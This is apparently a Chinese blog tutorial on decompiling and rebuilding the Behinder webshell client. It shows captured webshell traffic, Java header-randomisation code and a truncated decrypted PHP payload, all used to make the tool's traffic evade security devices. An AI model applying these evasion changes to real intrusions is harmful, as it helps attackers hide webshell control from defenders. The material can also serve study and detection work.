<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>冰蝎二开从0到1 | Bohemian</title><meta name="author" content="bohemian"><meta name="copyright" content="bohemian"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="..."><link rel="shortcut icon" href="/images/website/favicon.png"><link rel="canonical" href="https://bohemian.top/2025/06/19/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80v1-0/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!true && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?akkUkVXulwUkbwBp";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
btf.addGlobalFn('pjaxComplete', () => {
  _hmt.push(['_trackPageview',window.location.pathname])
}, 'baidu_analytics')
</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-3Z9EQ7RWNS"></script><script>window.dataLayer = window.dataLayer || []
function gtag(){dataLayer.push(arguments)}
gtag('js', new Date())
gtag('config', 'G-3Z9EQ7RWNS')
btf.addGlobalFn('pjaxComplete', () => {
  gtag('config', 'G-3Z9EQ7RWNS', {'page_path': window.location.pathname})
}, 'google_analytics')
</script><link rel="stylesheet" href="/-a" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: {"appId":"SFZ331F775","apiKey":"d942c1c63cb7ca27d841499faf4a0ec8","indexName":"blogsearch","hitsPerPage":6,"languages":{"input_placeholder":"搜索文章","hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，耗时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"top-right"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '冰蝎二开从0到1',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  isShuoshuo: false
}</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/website/avatar.jpg" onerror="onerror=null;src='/images/others/xingkong.jpg'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">65</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">50</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/images/冰蝎二开从0到1/image-20250706005428414.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Bohemian</span></a><a class="nav-page-title" href="/"><span class="site-name">冰蝎二开从0到1</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">冰蝎二开从0到1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-06-19T08:52:04.000Z" title="发表于 2025-06-19 16:52:04">2025-06-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-05T17:51:40.156Z" title="更新于 2025-07-06 01:51:40">2025-07-06</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">4,307</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>19分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>最近学习了一下冰蝎和哥斯拉的二开，但也只是学习了一丢丢皮毛，这里记录一下。</p>
<p>继上次二开哥斯拉后，已经过去了七个月了，项目收获了很多star，感谢大家。</p>
<p>上次我们已经对godzilla进行了二开，这次我们继续对冰蝎进行简单的二开。</p>
<h5 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h5><p>首先致敬一下原版冰蝎，原版地址<a target="_blank" rel="noopener" href="https://github.com/rebeyond/Behinder">https://github.com/rebeyond/Behinder</a></p>
<p>我们这里使用的最新的[<a target="_blank" rel="noopener" href="https://github.com/rebeyond/Behinder/releases/tag/Behinder_v4.1%E3%80%90t00ls%E4%B8%93%E7%89%88%E3%80%91">Behinder_v4.1【t00ls专版】</a> <a target="_blank" rel="noopener" href="https://github.com/rebeyond/Behinder/releases/latest">Latest</a>]版本，进行逆向及二开。虽然是4.1版本，但是本文还是在冰蝎3的木马上做研究。冰蝎因为涉及到自己设置加密解密脚本，我们将下篇文章进行研究。</p>
<p>反编译网址，<a target="_blank" rel="noopener" href="https://www.decompiler.com/%EF%BC%8C%E7%9B%B4%E6%8E%A5%E6%8B%96%E5%85%A5jar%E5%8C%85%E5%8D%B3%E5%8F%AF%EF%BC%8C%E5%BE%88%E6%96%B9%E4%BE%BF%E3%80%82">https://www.decompiler.com/，直接拖入jar包即可，很方便。</a></p>
<p>当然也可以使用idea的插件进行反编译，都一样。</p>
<p>ok开始</p>
<h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><p>这里细节的反编译及配置就不在此文章中体现了，这里配置的过程和哥斯拉一模一样。有兴趣的同学可以回看之前的文章<a href="https://bohemian.top/2024/09/03/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/">godzilla二开</a>学习。</p>
<p>只是接着添加主类不是哥斯拉的路径</p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701203019979.png" alt="image-20250701203019979"></p>
<p>是在这个路径，这个路径实际上是自己出来的。</p>
<p>要将反编译的src\META-INF/MANIFEST.MF源文件，放到src下面，注意路径。这个主类的路径就自己出来了。</p>
<p>点击选中主类，我们既可以愉快的二开了。</p>
<h5 id="改标题"><a href="#改标题" class="headerlink" title="改标题"></a>改标题</h5><p>现在就可以编译了，我们先简单的改一下标题。</p>
<p>复制一份文件，冰蝎的标题在net/rebeyond/behinder/core/Constants.java复制src/net/rebeyond/behinder/core/Constants.java，没有的目录要创建一下。目录一定要对齐。这里一定要清楚，不要在原版的那个和编译的那些文件里改，想改什么，把目录对齐，创建复制文件。</p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701204109794.png" alt="image-20250701204109794"></p>
<p>这里就可以看到相关的参数了，随意更改，老样子，我们随便改一下就好。</p>
<p>然后build project  在build artifacts 就可以了。</p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701204905919.png" alt="image-20250701204905919"></p>
<p>这里有一点要注意，就是如果你运行生成好的jar，他说数据库未找到，</p>
<p>那么你需要编辑一下环境</p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701205042896.png" alt="image-20250701205042896"></p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701205104146.png" alt="image-20250701205104146"></p>
<p>这个working directory需要设成你的生成文件的目录，这样，Behinder.Jar就能找到相关的数据库文件了，</p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701205303687.png" alt="image-20250701205303687"></p>
<p>当然别忘了把Behinder自带的目录都挪过来。</p>
<h5 id="全局改造"><a href="#全局改造" class="headerlink" title="全局改造"></a>全局改造</h5><p>我们知道，godzilla和Behinder都有一些强特征，我们可以加一下混淆或者简单改改。</p>
<p>看网上一些大师傅分析的结果，似乎都比较久远（3.0），我们尝试分析一下。</p>
<p>冰蝎是没有像哥斯拉一样的测试按钮的，我们只能直接打开。</p>
<p>在我们直接打开后，会发现，有三个数据包</p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701210316376.png" alt="image-20250701210316376"></p>
<p>我们先来看第一个包，我们就</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST /rebeyond/mian2.php HTTP/1.1</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Content-type: application/x-www-form-urlencoded</span><br><span class="line">Referer: http://192.168.133.128:11001/DR6D/NX.php</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36</span><br><span class="line">Content-Length: 3096</span><br><span class="line">Host: 192.168.133.128:11001</span><br><span class="line">Connection: close</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">3Mn1yNMtoZViV5wotQHPJtww..</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx</span><br><span class="line">Date: Tue, 01 Jul 2025 12:55:12 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Set-Cookie: PHPSESSID=ro9l5p843f3h6l9s30mcg8951c; path=/</span><br><span class="line">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Content-Length: 286</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>这里可以看到请求包中有</p>
<p>Accept: application/json, text/javascript, <em>/</em>; q=0.01<br>Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7<br>Content-type: application/x-www-form-urlencoded<br>Referer: <a target="_blank" rel="noopener" href="http://192.168.133.128:11001/DR6D/NX.php">http://192.168.133.128:11001/DR6D/NX.php</a><br>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36</p>
<p>这些都是我们可以修改的，</p>
<p>在net/rebeyond/behinder/core/Constants.java</p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701212418925.png" alt="image-20250701212418925"></p>
<p>可以看到相关的定义</p>
<p>Accept: application/json, text/javascript, <em>/</em>; q=0.01，表示客户端（例如浏览器或爬虫）告诉服务器：</p>
<blockquote>
<p>“我能接受这些类型的数据格式作为响应内容，按优先级排列如下。”</p>
</blockquote>
<ol>
<li><p><strong><code>application/json</code></strong></p>
<ul>
<li>客户端最希望服务器返回 JSON 格式的数据；</li>
<li>典型于前后端通信、Ajax 请求、API 接口调用。</li>
</ul>
</li>
<li><p><strong><code>text/javascript</code></strong></p>
<ul>
<li>如果不能返回 JSON，可以返回 JavaScript 脚本（例如 JSONP 响应）；</li>
<li>虽然现在 <code>application/javascript</code> 更标准，但 <code>text/javascript</code> 仍被广泛支持。</li>
</ul>
</li>
<li><p><strong><code>\*/\*; q=0.01</code></strong></p>
<ul>
<li><p><code>*/*</code> 意思是「任何其他类型都可以接受」；</p>
</li>
<li><p><code>q=0.01</code> 是质量因子（quality factor），表示优先级很低（取值范围是 0.0 ~ 1.0）；</p>
</li>
<li><p>这里的 <code>q=0.01</code> 表示除非前面都不满足，否则不考虑其他类型。</p>
</li>
</ul>
</li>
</ol>
<p>这里可以看到都是常用的Accept ，没有什么特殊的。</p>
<p>原版里面给了一个accept，有同学问，不是给了两个么，是的，给了两个，</p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701214434071.png" alt="image-20250701214434071"></p>
<p>在同目录下的shellservice里面，作者定义了这个，最后一个永远不会被选中。我们给他加上，并且加几个字符串随机。</p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701215842183.png" alt="image-20250701215842183"></p>
<p>这样的话，就可以简单随机了，大概率感觉不会被设备标记，太普通了</p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701220326930.png" alt="image-20250701220326930"></p>
<p>一般也都是这种</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public static String[] userAgents = new String[]&#123;&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36&quot;, &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36 Edg/99.0.1150.55&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0&quot;, &quot;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36&quot;, &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36&quot;, &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0&quot;, &quot;Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko&quot;&#125;;</span><br></pre></td></tr></table></figure>

<p>ua也定义了一下，看起来也都是一些常见的ua，我们直接给他换成我的edge，google，firefox的。</p>
<p>  public static String[] userAgents在这里修改就行。</p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701221207713.png" alt="image-20250701221207713"></p>
<p>Accept-Language这里也简单修改一下，</p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701222840016.png" alt="image-20250701222840016"></p>
<p>大家仔细观察在上面bp图里面有一个Referer字段，这个字段是作者加的，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">private String getReferer() &#123;</span><br><span class="line">        String refer;</span><br><span class="line">        URL u = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            u = new URL(this.effectShellEntity.getString(&quot;url&quot;));</span><br><span class="line">            String oldPath = u.getPath();</span><br><span class="line">            String newPath = &quot;&quot;;</span><br><span class="line">            String ext = oldPath.substring(oldPath.lastIndexOf(&quot;.&quot;));</span><br><span class="line">            oldPath = oldPath.substring(0, oldPath.lastIndexOf(&quot;.&quot;));</span><br><span class="line">            String[] parts = oldPath.split(&quot;/&quot;);</span><br><span class="line">            for (int i = 0; i &lt; parts.length; ++i) &#123;</span><br><span class="line">                if (parts[i].length() == 0) continue;</span><br><span class="line">                if (new Random().nextBoolean()) &#123;</span><br><span class="line">                    int randomNum = new Random().nextInt(parts[i].length());</span><br><span class="line">                    if (randomNum == 0) &#123;</span><br><span class="line">                        randomNum = 4;</span><br><span class="line">                    &#125;</span><br><span class="line">                    String randStr = new Random().nextBoolean() ? Utils.getRandomString(randomNum).toLowerCase() : Utils.getRandomString(randomNum).toUpperCase();</span><br><span class="line">                    newPath = newPath + &quot;/&quot; + randStr;</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">                newPath = newPath + &quot;/&quot; + parts[i];</span><br><span class="line">            &#125;</span><br><span class="line">            newPath = newPath + ext;</span><br><span class="line">            refer = this.currentUrl.replace(u.getPath(), newPath);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            return this.currentUrl;</span><br><span class="line">        &#125;</span><br><span class="line">        return refer;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701225252868.png" alt="image-20250701225252868"></p>
<p>响应的代码也是在shellservcie里，这一大段的意思就是，先获取根目录如Referer: <a target="_blank" rel="noopener" href="http://192.168.133.128:11001/%EF%BC%8C%E7%84%B6%E5%90%8E%E9%9A%8F%E6%9C%BA%E5%8F%96%E5%87%A0%E4%B8%AA%E5%AD%97%E7%AC%A6%EF%BC%8C%E6%94%BE%E5%88%B0%E5%90%8E%E9%9D%A2%EF%BC%8C%E7%84%B6%E5%90%8E%E6%98%AF%E4%BB%80%E4%B9%88%E8%AF%AD%E8%A8%80%E7%9A%84%E8%84%9A%E6%9C%AC%E5%B0%B1%E5%8A%A0%E4%B8%80%E4%B8%8B%E9%9A%8F%E6%9C%BA%E5%87%A0%E4%B8%AA%E5%AD%97%E7%AC%A6.php%EF%BC%8C%E6%AF%8F%E6%AC%A1%E6%9B%BF%E6%8D%A2%E9%83%BD%E6%98%AF%E9%9A%8F%E6%9C%BA%E7%9A%84%EF%BC%8C%E5%8F%AF%E8%83%BD%E4%B8%8D%E6%9B%BF%E6%8D%A2%E6%88%91%E4%BB%AC%E5%BD%93%E5%89%8D%E7%9A%84%E7%9B%AE%E5%BD%95%EF%BC%8C%E5%8F%AF%E8%83%BD%E9%83%A8%E6%9B%BF%E6%8D%A2shell%E5%90%8D%E5%AD%97%EF%BC%8C%E5%B0%B1%E5%83%8F%E4%B8%8B%E9%9D%A2%E8%BF%99%E6%A0%B7%E3%80%82">http://192.168.133.128:11001/，然后随机取几个字符，放到后面，然后是什么语言的脚本就加一下随机几个字符.php，每次替换都是随机的，可能不替换我们当前的目录，可能部替换shell名字，就像下面这样。</a></p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701225830441.png" alt="image-20250701225830441"></p>
<p>如果我们把这个referer去掉，</p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701225930317.png" alt="image-20250701225930317"></p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701230032932.png" alt="image-20250701230032932"></p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701230059005.png" alt="image-20250701230059005"></p>
<p>没有referer 也是正常使用的。</p>
<p>这里猜测作者是想通过referer 进行迷惑设备或者人，我们这里就先给他去掉吧。</p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250701230330965.png" alt="image-20250701230330965"></p>
<p>在很多网站上我们都可以看到有referer ，这或许会成为检测的标准，或者不会，我们就先去掉吧，后面如果有需要，我们在进行重写。</p>
<p>到此，大概请求的header就差不多了，我看有大佬的文章说，有的Content-Length在5700左右</p>
<p>这个是没有问题的，我们来看一下流量。为什么会产生这个数字。</p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702003623065.png" alt="image-20250702003623065"></p>
<p>冰蝎中每个语言都对应了模块</p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702003654124.png" alt="image-20250702003654124"></p>
<p>这些模块就是  当我们打开冰蝎的黑框后，我们在命令执行这个页面执行命令，就会调用cmd模块的代码。</p>
<p>当我们执行ls后，</p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702004017564.png" alt="image-20250702004017564"></p>
<p>先会发一个大包，aes解开后</p>
<p>需要解开一个base464，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span 